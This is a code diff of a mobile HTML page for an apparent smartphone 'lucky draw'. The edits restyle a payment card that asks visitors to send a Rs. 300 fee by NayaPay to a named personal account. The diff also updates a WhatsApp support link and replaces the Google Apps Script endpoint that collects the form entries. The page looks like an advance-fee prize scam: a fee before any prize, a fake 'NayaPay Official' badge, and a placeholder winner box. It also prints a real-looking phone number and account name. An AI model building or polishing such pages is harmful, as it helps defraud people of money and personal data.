@@ -11,8 +11,7 @@
         .container { max-width: 450px; margin: 20px auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); overflow: hidden; }
         img { width: 100%; border-radius: 10px; margin-bottom: 15px; }
         .winner-box { background: #fff9c4; border: 2px solid #fbc02d; padding: 15px; border-radius: 10px; margin-bottom: 20px; }
-        .pay-card { border: 2px solid #ff5252; background: #fff5f5; padding: 15px; border-radius: 15px; margin-bottom: 20px; }
-        .pay-number { font-size: 32px; margin: 10px 0; color: #ff5252; letter-spacing: 1px; font-weight: bold; }
+        .pay-card { border: 3px solid #ff5252; background: #fff5f5; padding: 20px; border-radius: 15px; margin-bottom: 20px; }
         input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; }
         .btn-join { width: 100%; padding: 15px; background: #ff5252; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
         .footer { margin-top: 30px; padding: 20px; font-size: 11px; color: #777; border-top: 1px solid #eee; }
@@ -30,7 +29,6 @@
 
 <div class="container">
     <img src="mobile.jpg" alt="Win Smartphone">
-
     <div class="winner-box">
         <h3 style="margin:0; color:#fbc02d;">🎉 LATEST LUCKY WINNER 🎉</h3>
         <h2 id="winnerName" style="margin:5px 0;">Coming Soon</h2>
@@ -38,14 +36,11 @@
     </div>
 
     <div class="pay-card">
-        <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
-            <img src="https://img.icons8.com/color/48/wallet--v1.png" style="width: 30px; height: 30px; margin-right: 10px; margin-bottom: 0;">
-            <h2 style="color: #c62828; margin: 0; font-size: 22px;">NayaPay Payment</h2>
-        </div>
-        <div style="background: white; padding: 10px; border-radius: 10px; border: 1px solid #ef9a9a;">
-            <p style="font-size: 16px; margin: 0; color: #555;">Send Registration Fee <b>Rs. 300</b> to:</p>
-            <div class="pay-number">03186761010</div>
-            <p style="font-size: 15px; font-weight: bold; color: #333; margin: 0;">Title: Muhammad Sarfraz</p>
+        <div style="background: #ff5252; color: white; padding: 5px 15px; border-radius: 50px; display: inline-block; font-weight: bold; margin-bottom: 15px; font-size: 18px;">💳 NayaPay Official</div>
+        <div style="background: white; padding: 15px; border-radius: 10px; border: 1px solid #ef9a9a;">
+            <p style="font-size: 16px; margin: 0; color: #555;">Send Fee <b>Rs. 300</b> to:</p>
+            <div style="font-size: 36px; margin: 10px 0; color: #ff5252; font-weight: 800;">03186761010</div>
+            <p style="font-size: 16px; font-weight: bold; color: #333; margin: 0; border-top: 1px dashed #ccc; padding-top: 10px;">Title: Muhammad Sarfraz</p>
         </div>
     </div>
 
@@ -61,17 +56,14 @@
     <h3 style="color: #333; margin-top: 0; font-size: 16px;">How to Participate?</h3>
     <ol style="padding-left: 20px; font-size: 13px; line-height: 1.8; color: #444;">
         <li>NayaPay par Rs. 300 send karein.</li>
-        <li>Payment ki <b>TID</b> copy karein.</li>
-        <li>Form fill karke <b>JOIN NOW</b> dabayein.</li>
-        <li>Verify hone par status <b>APPROVED</b> ho jayega.</li>
+        <li>TID copy karke form fill karein.</li>
+        <li>Verification ke baad status <b>Approved</b> ho jayega.</li>
     </ol>
 </div>
 
 <div class="support-box">
-    <h4 style="margin: 0; color: #1565c0; font-size: 15px;">Need Help? (Rabta Karein)</h4>
-    <a href="https://wa.me/923023313131" target="_blank" style="display: inline-block; padding: 10px 20px; background: #25d366; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 14px; margin-top: 10px;">
-        💬 WhatsApp: 0302-3313131
-    </a>
+    <h4 style="margin: 0; color: #1565c0;">Need Help?</h4>
+    <a href="https://wa.me/923023313131" target="_blank" style="display: inline-block; padding: 10px 20px; background: #25d366; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; margin-top: 10px;">💬 WhatsApp: 0302-3313131</a>
 </div>
 
 <div class="footer">
@@ -81,7 +73,8 @@
 </div>
 
 <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzjdAw-99efgueq46jFU3ZCiotXBs69TwQcq3jJdS4jNgF5y8OCclvE4pzc2K4T_ydYcw/exec";
+    // NEW LINK ADDED HERE
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzndEFHye4YdM9uhnXp_kaxFb4ZKCRUAsA0MK5CVoFreR_ajLnft7ilLEOsMs7CKeG7IQ/exec";
 
     window.onload = function() {
         if(localStorage.getItem("luckyName")) {
@@ -127,5 +120,4 @@
 </script>
 </body>
 </html>
-
 
